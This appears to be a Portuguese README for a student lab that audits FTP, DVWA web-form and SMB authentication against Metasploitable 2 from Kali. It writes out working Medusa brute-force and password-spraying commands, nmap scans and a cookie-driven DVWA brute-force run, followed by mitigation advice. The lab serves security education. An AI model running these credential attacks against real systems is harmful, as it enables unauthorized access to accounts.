# Auditoria de Autenticação com Kali Linux e Medusa

Projeto prático desenvolvido para o desafio da **DIO**, com o objetivo de estudar ataques de força bruta, password spraying e controles de proteção em um laboratório local e autorizado.

> [!CAUTION]
> Este material deve ser usado **somente em ambiente controlado, isolado e com autorização expressa**. Não execute os testes em sistemas públicos, corporativos ou de terceiros. As VMs vulneráveis não devem ficar expostas à Internet.

## Autor

**Carlos Alexandre Campos Saraiva**  
Analista de Tecnologia da Informação

## Objetivos

- Configurar duas máquinas virtuais no VirtualBox;
- Identificar serviços disponíveis no alvo de laboratório;
- Simular tentativas de autenticação em FTP, formulário web e SMB;
- Comparar força bruta, ataque de dicionário e password spraying;
- Validar os resultados sem alterar ou destruir dados;
- Registrar evidências e propor medidas de mitigação.

## Escopo e arquitetura do laboratório

| Componente | Função | Rede sugerida | IP de exemplo |
|---|---|---|---|
| Kali Linux | Máquina de auditoria | Host-only | `192.168.56.10` |
| Metasploitable 2 | Alvo vulnerável | Host-only | `192.168.56.101` |
| DVWA | Aplicação web vulnerável | Na VM-alvo ou VM isolada | `192.168.56.101` |

```text
[Host físico]
     |
[VirtualBox Host-only: 192.168.56.0/24]
     |-- Kali Linux .......... 192.168.56.10
     `-- Metasploitable 2 .... 192.168.56.101
```

**Regras de isolamento:** use somente o adaptador *Host-only* durante os testes, desative redirecionamento de portas e tire snapshots antes de iniciar. Se precisar atualizar o Kali, conecte temporariamente uma segunda interface NAT e remova-a antes dos testes.

## Estrutura do repositório

```text
.
├── README.md
├── docs/
│   └── evidencias.md
├── images/
│   └── .gitkeep
├── scripts/
│   └── dvwa_lab.sh
└── wordlists/
    ├── passwords.txt
    ├── spray-passwords.txt
    └── users.txt
```

## 1. Preparação do ambiente

### 1.1 Verificar endereços IP

No Kali:

```bash
ip -br address
```

No Metasploitable 2:

```bash
ifconfig
```

### 1.2 Confirmar conectividade

```bash
ping -c 4 192.168.56.101
```

### 1.3 Instalar e conferir as ferramentas no Kali

```bash
sudo apt update
sudo apt install -y medusa nmap smbclient
medusa -V
nmap --version
```

### 1.4 Descobrir serviços do alvo

```bash
nmap -sV -Pn -p 21,80,139,445 192.168.56.101 -oN nmap-servicos.txt
```

Antes de prosseguir, confirme que o endereço pertence exclusivamente à VM vulnerável.

## 2. Wordlists controladas

Os arquivos em `wordlists/` contêm poucas entradas fictícias para reduzir carga e evitar uso acidental fora do laboratório.

```bash
cat wordlists/users.txt
cat wordlists/passwords.txt
```

## 3. Cenário A: auditoria de autenticação FTP

### Objetivo

Verificar se uma conta de laboratório aceita senha fraca presente em uma pequena lista controlada.

### Comando

```bash
TARGET=192.168.56.101
medusa -h "$TARGET" -u msfadmin -P wordlists/passwords.txt -M ftp -f -v 6 | tee resultado-ftp.txt
```

### Validação controlada

Somente se o Medusa indicar sucesso, valide manualmente com a credencial de laboratório:

```bash
ftp 192.168.56.101
```

Não faça upload, alteração ou exclusão de arquivos. Registre apenas o resultado da autenticação e encerre a sessão com `bye`.

## 4. Cenário B: formulário web do DVWA

### Preparação

1. Acesse `http://192.168.56.101/dvwa/` no navegador do laboratório;
2. Autentique-se com a conta padrão definida no laboratório;
3. Em **DVWA Security**, selecione o nível **Low**;
4. Abra o módulo **Brute Force**;
5. Use as ferramentas do navegador para copiar o cookie de sessão `PHPSESSID`;
6. Substitua o valor de exemplo ao executar o script.

### Automação limitada

```bash
chmod +x scripts/dvwa_lab.sh
DVWA_URL='http://192.168.56.101/dvwa/vulnerabilities/brute/' \
DVWA_USER='admin' \
DVWA_COOKIE='PHPSESSID=SUBSTITUA; security=low' \
./scripts/dvwa_lab.sh
```

O script usa somente a lista curta do projeto, grava o código HTTP e procura o indicador de falha do DVWA. Se a versão do DVWA apresentar texto diferente, ajuste apenas a variável `FAIL_MARKER` no script.

## 5. Cenário C: password spraying em SMB

Password spraying testa **uma única senha por vez** em uma lista de usuários. Isso difere da força bruta tradicional, que testa muitas senhas contra uma conta.

### Enumerar compartilhamentos sem autenticação

```bash
smbclient -L //192.168.56.101 -N
```

Esse comando lista compartilhamentos quando o alvo permite sessão anônima. Ele não confirma uma lista completa de usuários.

### Teste controlado com Medusa

```bash
TARGET=192.168.56.101
PASSWORD=$(head -n 1 wordlists/spray-passwords.txt)
medusa -h "$TARGET" -U wordlists/users.txt -p "$PASSWORD" -M smbnt -f -v 6 | tee resultado-smb-spray.txt
```

Use apenas uma senha por rodada, poucas contas fictícias e intervalo entre execuções. Não utilize listas obtidas de vazamentos reais.

### Validação de acesso

Se houver resultado positivo, valide apenas a listagem de compartilhamentos:

```bash
smbclient -L //192.168.56.101 -U 'USUARIO%SENHA'
```

## 6. Registro dos resultados

Preencha `docs/evidencias.md` e salve capturas em `images/`, evitando expor senhas, cookies, tokens ou dados pessoais.

| Teste | Serviço | Resultado esperado | Resultado observado | Evidência |
|---|---|---|---|---|
| A | FTP | Identificar senha fraca de laboratório | Preencher | `images/ftp.png` |
| B | DVWA | Demonstrar automação limitada | Preencher | `images/dvwa.png` |
| C | SMB | Avaliar senha reutilizada entre contas | Preencher | `images/smb.png` |

## 7. Recomendações de mitigação

### FTP

- Desabilitar FTP simples quando não for necessário;
- Preferir SFTP/SSH ou FTPS com configuração segura;
- Bloquear autenticação anônima;
- Aplicar senhas longas e exclusivas;
- Restringir origem por firewall e segmentação de rede;
- Monitorar falhas repetidas de autenticação.

### Aplicações web

- Implementar MFA quando aplicável;
- Adotar limitação de tentativas por conta, IP e dispositivo;
- Usar atrasos progressivos e bloqueios temporários;
- Evitar mensagens que revelem se o usuário existe;
- Proteger sessões com cookies `HttpOnly`, `Secure` e `SameSite`;
- Centralizar logs e alertar sobre padrões anormais;
- Armazenar senhas com algoritmo apropriado e salt, como Argon2id ou bcrypt.

### SMB

- Desabilitar SMBv1;
- Eliminar contas e compartilhamentos anônimos;
- Aplicar MFA para acessos remotos por meio de uma camada compatível;
- Restringir TCP/445 por firewall e segmentação;
- Usar senhas exclusivas e controles contra spraying;
- Monitorar eventos de logon com falha e sucessos após múltiplas falhas;
- Revisar privilégios e remover contas inativas.

## 8. Conclusão

O laboratório demonstra que credenciais fracas e reutilizadas podem comprometer serviços distintos. A proteção efetiva depende de controles em camadas: política de senhas, MFA, limitação de tentativas, segmentação, protocolos modernos, monitoração e resposta a eventos.

## 9. Referências

- [Material do desafio DIO](https://hermes.dio.me/files/assets/2dd3d3ad-b7e5-4325-8d1d-ddd8e7205fea.pdf)
- [Kali Linux](https://www.kali.org/)
- [DVWA](http://www.dvwa.co.uk/)
- [Medusa](http://www.foofus.net/jmk/medusa/medusa.html)
- [Nmap Reference Guide](https://nmap.org/book/)
- [GitHub Markdown](https://docs.github.com/pt/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)

## Aviso legal

Este repositório tem finalidade exclusivamente educacional. O autor não incentiva acesso não autorizado, interrupção de serviços, coleta de credenciais reais ou qualquer atividade fora de sistemas próprios e formalmente autorizados.
